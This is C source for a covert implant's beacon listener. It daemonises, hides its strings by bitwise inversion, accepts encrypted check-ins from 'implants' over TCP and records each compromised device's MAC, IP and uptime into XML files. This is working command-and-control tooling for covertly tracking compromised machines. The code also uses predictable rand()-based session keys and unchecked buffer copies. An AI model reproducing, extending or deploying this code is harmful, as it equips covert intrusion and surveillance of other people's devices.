#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <getopt.h>

#include "polarssl/net.h"
#include "polarssl/xtea.h"

#include "crypto.h"
#include "blth.h"
#include "debug.h"

//**************************************************
//strings
//************************************************
//strings ...
#include "cry_strings_main.h"
#include "init_cry_strings.c"
#include "hc_strings_main.h"

//proj_strings.h
//string_utils
extern unsigned char usageString[8];
extern unsigned char commandString[50];
extern unsigned char pOptionString[64];
extern unsigned char fOptionString[80];
extern unsigned char cmdLineOptionFlags[6];
extern unsigned char defaultPath[9];
extern unsigned char bindString[22];
extern unsigned char bindFailedString[29];
extern unsigned char waitingString[39];
extern unsigned char acceptFailedString[32];
extern unsigned char xmlOpen[33];
extern unsigned char headerOpen[10];
extern unsigned char implantIdOpen[5];
extern unsigned char implantIdClose[7];
extern unsigned char ipOpen[5];
extern unsigned char ipClose[7];
extern unsigned char timeStampOpen[16];
extern unsigned char timeStampClose[18];
extern unsigned char byteCountOpen[12];
extern unsigned char byteCountClose[14];
extern unsigned char dataDescOpen[18];
extern unsigned char dataDescBeacon[7];
extern unsigned char dataDescClose[20];
extern unsigned char toolHandlerIdOpen[16];
extern unsigned char toolHandlerIdClose[18];
extern unsigned char headerClose[11];
extern unsigned char beaconOpen[10];
extern unsigned char deviceStatOpen[15];
extern unsigned char seqNum[38];
extern unsigned char ackNum[38];
extern unsigned char seqTrigger[38];
extern unsigned char uptimeOpen[22];
extern unsigned char uptimeClose[24];
extern unsigned char deviceStatClose[16];
extern unsigned char deviceIPOpen[12];
extern unsigned char netAddrOpen[18];
extern unsigned char addrStringOpen[16];
extern unsigned char addrStringClose[18];
extern unsigned char beaconIPMask[15];
extern unsigned char netAddrClose[19];
extern unsigned char deviceIPClose[13];
extern unsigned char macAddrOpen[13];
extern unsigned char macAddrClose[15];
extern unsigned char beaconClose[11];
extern unsigned char xmlClose[20];

void cl_string(unsigned char *str, int len);
 
void cl_string(unsigned char *str, int len) 
{
    int i;
    for (i = 0; i< len; i++) {
        str[i] = ~str[i];
    }

}

//init_strings
void init_hc_strings();

void init_hc_strings()
{
    	cl_string(usageString, 8);
	cl_string(commandString, 50);
	cl_string(pOptionString, 64);
	cl_string(fOptionString, 80);
	cl_string(cmdLineOptionFlags, 6);
	cl_string(defaultPath, 9);
	cl_string(bindString, 22);
	cl_string(bindFailedString, 29);
	cl_string(waitingString, 39);
	cl_string(acceptFailedString, 32);
	cl_string(xmlOpen, 33);
	cl_string(headerOpen, 10);
	cl_string(implantIdOpen, 5);
	cl_string(implantIdClose, 7);
	cl_string(ipOpen, 5);
	cl_string(ipClose, 7);
	cl_string(timeStampOpen, 16);
	cl_string(timeStampClose, 18);
	cl_string(byteCountOpen, 12);
	cl_string(byteCountClose, 14);
	cl_string(dataDescOpen, 18);
	cl_string(dataDescBeacon, 7);
	cl_string(dataDescClose, 20);
	cl_string(toolHandlerIdOpen, 16);
	cl_string(toolHandlerIdClose, 18);
	cl_string(headerClose, 11);
	cl_string(beaconOpen, 10);
	cl_string(deviceStatOpen, 15);
	cl_string(seqNum, 38);
	cl_string(ackNum, 38);
	cl_string(seqTrigger, 38);
	cl_string(uptimeOpen, 22);
	cl_string(uptimeClose, 24);
	cl_string(deviceStatClose, 16);
	cl_string(deviceIPOpen, 12);
	cl_string(netAddrOpen, 18);
	cl_string(addrStringOpen, 16);
	cl_string(addrStringClose, 18);
	cl_string(beaconIPMask, 15);
	cl_string(netAddrClose, 19);
	cl_string(deviceIPClose, 13);
	cl_string(macAddrOpen, 13);
	cl_string(macAddrClose, 15);
	cl_string(beaconClose, 11);
	cl_string(xmlClose, 20);
}

#define TIMESTAMP_LEN 	20
#define MAC_ADDR_LEN 	20
#define BTHP_HDR_LEN 	14
#define BUFFER_LEN	32
#define KEY_LEN		16
#define XOR_KEY		5
#define TOOL_HANDLER_ID 88

static int RAND_INIT = 0;
const char* OPT_STRING = "p:f:h";
struct rsi_args file_args;
struct _BthpHdr_T *ptr;

static void print_usage(char* exe_name);
static void rand_init();
static char randChar();
static int  listen_for_beacons(int port);
static void get_timestamp(char* output);
static void create_filename(char* mac_addr, char* path, char* output);
static void write_rsi_file();
static void decrypt_data(unsigned char *src,unsigned char *dest, unsigned char* key);
static void add_hdr(unsigned char* output, unsigned long message_length);
static void remove_hdr(unsigned char* input, unsigned char* output);
static void create_key(unsigned char* buf, unsigned char* key);
static void strip_dash(char* input, char* output);

int main( int argc, char** argv)
{
	int ret;
	int c = 0;
	int listen_port = -1;
	char* rsi_file_path = NULL;

	//strings
    	init_hc_strings();
	init_cry_strings();

	//check for command line params
	while( EOF != (c = getopt(argc,argv,OPT_STRING)))
	{
		switch(c)
		{
		case 'p':
			listen_port =  atoi(optarg);
			break;
		case 'f':
			file_args.path = optarg;
			break;
		case 'h':
			print_usage(argv[0]);
			exit(0);
			break;
		default:
			print_usage(argv[0]);
			exit(0);
			break;
		}
	}

	//if no port is specified use the default
	if(listen_port < 0)
	{
		listen_port = 4098;
	}

	//if no direcory for the rsi files is specified
	//use the defualt.
	if(rsi_file_path == NULL)
	{
		//file_args.path = "beacons/";
		file_args.path = (char *) defaultPath;
	}

	//if not running in debug mode then run in the background
#ifndef DEBUG
	daemon(1,0);
#endif
	//start listening for beacons
	ret = listen_for_beacons(listen_port);
	
	return ret;
}

void print_usage(char* exe_name)
{
	//printf("%s %s:\n",exe_name, (char *) usageString);
	printf("%s %s:\n",exe_name, usageString);
	//printf("%s -p <port> -f <rsi_file_path> \n", exe_name);
	printf("%s %s", exe_name, commandString);
	//printf("	-p - port to listen for proxy connections on. (default = 4098)\n");
	printf("	%s", pOptionString);
	//printf("	-f - file path to write the rsi beacon files out to. (default = beacons/)\n");
	printf("	%s", fOptionString);
	printf("\n");
}

void rand_init()
{
	struct timeval tod;
	
	if(RAND_INIT) return;
	
	gettimeofday(&tod, NULL);
	srand( (tod.tv_usec ^ tod.tv_sec) ^ getpid() );

	RAND_INIT = 1;
	return;
}

char randChar()
{
	if(!RAND_INIT)
	{
		rand_init();
	}

	return (char)rand();
}

int listen_for_beacons(int port)
{
	int			ret, len, buflen; 
	int			listen_fd;				//listen socket
	int 			client_fd;				//proxy socket
	unsigned char		buf[1024];				//read buffer
	unsigned char		key[16];				//encryption key
   	unsigned char		ebuf[BUFFER_LEN];			//encryption buffer
	unsigned char		message[BTHP_HDR_LEN + BUFFER_LEN];	//message buffer

	/*
     	* 2. Setup the listening TCP socket
   	*/
   	D(printf( "\n" ));
   	//printf( "  . Bind on localhost:4098/ ..." );
   	D(printf( " %s:%d ...", bindString, 4098 ));
   	D(fflush( stdout ));

    	if( ( ret = net_bind( &listen_fd, NULL, port ) ) != 0 )
    	{
     	   	//printf( " failed\n  ! net_bind returned %d\n\n", ret );
     	   	D(printf( "%s %d\n\n", bindFailedString, ret ));
        	goto exit;
    	}

    	D(printf( " ok\n" ));

    	/*
     	* 3. Wait until a client connects
     	*/
accept:
    	//printf( "  . Waiting for a remote connection ..." );
    	D(printf( " %s", waitingString ));
    	D(fflush( stdout ));

    	if( ( ret = net_accept( listen_fd, &client_fd, NULL ) ) != 0 )
    	{
       		//printf( " failed\n  ! net_accept returned %d\n\n", ret );
       		D(printf( "%s %d\n\n", acceptFailedString, ret ));
        	goto exit;
    	}

    	D(printf( " ok\n" ));
	
	do
	{

		memset( buf, 0, 1024 );
		len = read( client_fd, buf, 1024 );
		if(len > 0)
		{
			ptr = ( struct _BthpHdr_T *) buf;

			//strip header
			remove_hdr(buf, ebuf);
			
			buflen = BTHP_HDR_LEN + BUFFER_LEN;
			
			//put the BTHP header on the message
			add_hdr(message, BUFFER_LEN);

			//create the key and copy it into the message buffer
			create_key(message + BTHP_HDR_LEN, key);
			#ifdef DEBUG
			printf("\nKey = ");
			for(len = 0; len < 16; len++)
			{
				printf("%x ",key[len]);
			}
			printf("\n\n");
			#endif
 
			//send the key
			if( (ret = write(client_fd, message, buflen)) != buflen)
			{
				net_close(client_fd);
				goto accept;
			}
			
			//reset the buffer
			memset(buf,0,sizeof(buf));

			//read in beacon packet
			len = read(client_fd, buf, 1024);
			
			ptr = ( struct _BthpHdr_T *) buf;
			
			//remove the bthp header
			remove_hdr(buf, ebuf);
			
			//decrypt the beacon data
			decrypt_data(ebuf, buf+ntohs(ptr->hdrLen),key);
			
			//copy data into beacon header struct
			file_args.bfptr = (struct beacon_field *)(buf + ntohs(ptr->hdrLen));
			file_args.dataLen = ntohl(ptr->dataLen);			

			//write data out to a ripper snapper xml file
			write_rsi_file();

		} //end if(len > 0)
	} while ( len > 0 );

	//close the socket
	net_close( client_fd );

	goto accept;

exit:
	//close the socket
    	net_close( client_fd );
    	return( ret );
}

void get_timestamp(char* output)
{
	time_t ltime;
	struct tm *t;
	char tmp[100];

	//get the local computer time
	ltime = time(NULL);
	t = localtime(&ltime);
	
	memset(tmp, 0, 100);
	//create the timestamp
	sprintf(tmp, "%d-%02d-%02d %02d:%02d:%02d",1900 + t->tm_year,
					 1 + t->tm_mon,
					 t->tm_mday,
					 t->tm_hour,
					 t->tm_min,
					 t->tm_sec);

	memcpy(output,tmp,strlen(tmp));
}

void create_filename(char* mac_addr, char* path, char* output)
{
	time_t ltime;
	struct tm *t;
	char tmp[1024];

	//get the local time
	ltime = time(NULL);
	t = localtime(&ltime);

	memset(tmp, 0, 1024);
	//create the filename
	sprintf(tmp, "%s%d-%02d-%02d_%02d:%02d:%02d_%s.rsi", path,1900 + t->tm_year,
							1 + t->tm_mon,
							t->tm_mday,
							t->tm_hour,
							t->tm_min,
							t->tm_sec,
							mac_addr);

	memcpy(output,tmp, strlen(tmp));
}

void write_rsi_file()
{
	char timestamp[100];
	char filename[1024];
	char uf_mac[50];
	FILE *file;

	//get a valid timestamp
	memset(timestamp, 0, 100);
	get_timestamp(timestamp);

	//create our file name
	memset(filename, 0, 1024);
	create_filename(file_args.bfptr->mac, file_args.path, filename);
	
	//strip the dashes from the mac address
	memset(uf_mac, 0, 50);
	strip_dash(file_args.bfptr->mac,uf_mac);

	//create and open our file
	file = fopen(filename,"w+");	

	//if the directory doesn't exist try and create it
	if(file == NULL)
	{
		//attempt to make the directory
		mkdir(file_args.path, S_IRWXU);
		//attempt to open the file again
		file = fopen(filename,"w+");
	}

	//write out the data to the open file.
	//fprintf(file,"<ToolHandlerFile version=\"1.0\">\n");
	fprintf(file,"%s", xmlOpen);
	//fprintf(file,"	<header>\n");
	fprintf(file, "    %s", headerOpen);
	//fprintf(file,"		<ID>0xDEADBEEF</ID>\n");
	fprintf(file,"		%s%s%s", implantIdOpen, uf_mac, implantIdClose);
	//fprintf(file,"		<IP>%s</IP>\n", file_args.proxy_ip);
	fprintf(file,"		%s%s%s", ipOpen, file_args.proxy_ip, ipClose);
	//fprintf(file,"		<dateTimeStamp>%s</dateTimeStamp>\n",timestamp);
	fprintf(file,"		%s%s%s",timeStampOpen, timestamp, timeStampClose);
	//fprintf(file,"		<byteCount>%d</byteCount>\n",file_args.dataLen);
	fprintf(file,"		%s%d%s", byteCountOpen, file_args.dataLen, byteCountClose);
	//fprintf(file,"		<dataDescription>Beacon</dataDescription>\n");
	fprintf(file,"		%s%s%s", dataDescOpen, dataDescBeacon, dataDescClose);
	//fprintf(file,"		<toolHandlerID>%x</toolHandlerID>\n",ntohl(file_args.bfptr->tool_id));
	fprintf(file,"		%s%d%s", toolHandlerIdOpen, TOOL_HANDLER_ID, toolHandlerIdClose);
	//fprintf(file,"	</header>\n");
	fprintf(file,"	   %s", headerClose);
	//fprintf(file,"	<beacon>\n");
	fprintf(file,"	%s", beaconOpen);
	//fprintf(file,"		<deviceStats>\n");
	fprintf(file,"		%s", deviceStatOpen);
	//fprintf(file,"			<beaconSeqNumber>10</beaconSeqNumber>\n");
	fprintf(file,"			%s", seqNum);
	//fprintf(file,"			<beaconAckNumber>8</beaconAckNumber>\n");
	fprintf(file,"			%s", ackNum);
    //	fprintf(file,"			<sequenceTrigger>0</sequenceTrigger>\n");
      	fprintf(file,"			%s", seqTrigger);
    //  	fprintf(file,"			<deviceUptime>%d</deviceUptime>\n",ntohl(file_args.bfptr->uptime));
      	fprintf(file,"			%s%d%s", uptimeOpen, ntohl(file_args.bfptr->uptime), uptimeClose);
	//fprintf(file,"		</deviceStats>\n");
	fprintf(file,"		%s", deviceStatClose);
   	//fprintf(file,"		<deviceIP>\n");
   	fprintf(file,"		%s", deviceIPOpen);
    //  	fprintf(file,"			<networkAddress>\n");
      	fprintf(file,"			%s", netAddrOpen);
    //    fprintf(file,"				<addressString>%s</addressString>\n", file_args.beacon_ip);
        fprintf(file,"				%s%s%s", addrStringOpen, file_args.beacon_ip, addrStringClose);
    //    fprintf(file,"				<mask></mask>\n");
        fprintf(file,"				%s", beaconIPMask);
    //  	fprintf(file,"			</networkAddress>\n");
      	fprintf(file,"			%s", netAddrClose);
    //	fprintf(file,"		</deviceIP>\n");
    	fprintf(file,"		%s", deviceIPClose);
    //  	fprintf(file,"		<MACAddress>%s</MACAddress>\n", file_args.bfptr->mac);
      	fprintf(file,"		%s%s%s", macAddrOpen, file_args.bfptr->mac, macAddrClose);
  	//fprintf(file,"	</beacon>\n");
  	fprintf(file,"	%s", beaconClose);
	//fprintf(file,"</ToolHandlerFile>\n");
	fprintf(file,"%s", xmlClose);
	
	//free(timestamp);
	//free(filename);
	fclose(file);
}

void decrypt_data(unsigned char *src, unsigned char *dest, unsigned char* key)
{
	xtea_context xtea;
	int len, i;
	unsigned char *src_ptr;
	unsigned char *dest_ptr;
	unsigned char enc[8];

	//initialize the xtea encryption context
	
	xtea_setup(&xtea, key);
	
	len = sizeof(struct beacon_field);
	i = 0;

	//encrypt the buffer
	while( i < len)
	{
		src_ptr = src + i;
		dest_ptr = dest + i;
		
		//encrypt the buffer
		xtea_crypt_ecb(&xtea,XTEA_DECRYPT,src_ptr,enc);

		if(len - i > 8)
		{
			memcpy(dest_ptr,enc,8);
			i += 8;
		}
		else
		{
			memcpy(dest_ptr,enc, (len -i));
			i = i + (len - i);
		}
	}
}

void add_hdr(unsigned char* output, unsigned long message_length)
{
	struct _BthpHdr_T	outHdr;
	struct addl_hdr_field	addOut;
	
	outHdr.version = 1;
	outHdr.type = 2;
	outHdr.hdrLen = htons(14);
	outHdr.dataLen = htonl(message_length);
	outHdr.proxyId = ptr->proxyId;

	addOut.type = 0;
	addOut.len  = 0;
		
	memcpy(output,(unsigned char*)&outHdr ,12);
	memcpy(output + 12,(unsigned char*)&addOut,2);
}

void remove_hdr(unsigned char* input, unsigned char* output)
{
	struct addl_hdr_field	*ahptr;
	int n;
	unsigned int 		nip;
   	char* 			ip;
   	struct in_addr 		in;

	D(printf( " BLOT HEADER\n" ));
	D(printf( " Version       = 0x%X\n", ptr->version ));
	D(printf( " Type          = 0x%X\n", ptr->type ));
	D(printf( " Header Length = %d\n", ntohs( ptr->hdrLen ) ));
	D(printf( " Data Length   = %d\n", ntohl( ptr->dataLen ) ));
	D(printf( " Proxy ID 	  = %d\n", ntohl( ptr->proxyId ) ));

	if ( ntohs( ptr->hdrLen ) > 12 )
	{
		// header includes Additional Fields because Header Length > 12
		ahptr = (struct addl_hdr_field *) ( input + 12 );
		n = 0;

		while ( (unsigned char *)ahptr - input < ntohs( ptr->hdrLen ) )
		{
			// there are still more Additional Header fields
			D(printf( "ADDITIONAL FIELD #%d\n", n ));
			D(printf( " Type    = 0x%X\n", ahptr->type ));
			D(printf( " Length  = 0x%d\n", ahptr->len ));
					
			if( (int)ahptr->len == 4)
			{
				memcpy(&nip,ahptr->data , 4);
				in.s_addr = nip;

				if( ahptr->type == 2)
				{
					memcpy(file_args.beacon_ip,inet_ntoa(in),15);

				} else if( ahptr->type == 3)
				{
					memcpy(file_args.dst_ip,inet_ntoa(in),15);

				} else if( ahptr->type == 6)
				{
					memcpy(file_args.proxy_ip,inet_ntoa(in),15);
				}
				ip = inet_ntoa(in);
				D(printf( " Data: = %s\n",ip));
			}

			// add two for the type and length fields.  ahptr->length to jump over the data portion
			ahptr = (struct addl_hdr_field *)( (char *)ahptr + ahptr->len + 2 );
			n++;
		}
	}

	memcpy(output, input + ntohs( ptr->hdrLen), 32);
	
}

void create_key(unsigned char* buf, unsigned char* key)
{
	int i, offset;
	
	//generate a random 32 byte buffer
	for(i = 0; i < 32; i++)
	{
		buf[i] = (unsigned char)randChar();
	}

	//calculate the offset of the beginning of the key
	//we do this by XOR in the first byte of the buffer
	//with a XOR_KEY and mod the result by 15 to get the 
	//offset.
	offset = (buf[0] ^ XOR_KEY) % 15;

	//copy the 16 byte key
	memcpy(key, buf + offset + 1, KEY_LEN);
}

void strip_dash(char* input, char* output)
{
	char* tok;
	char  tmp[MAC_ADDR_LEN + 1];
	
	memset(tmp, 0, MAC_ADDR_LEN + 1);
	memcpy(tmp, input, MAC_ADDR_LEN);

	tok = strtok(tmp, "-");
	
	while(tok != NULL)
	{
		memcpy(output, tok, strlen(tok));
		output += strlen(tok);
		tok = strtok(NULL, "-");
	}
}
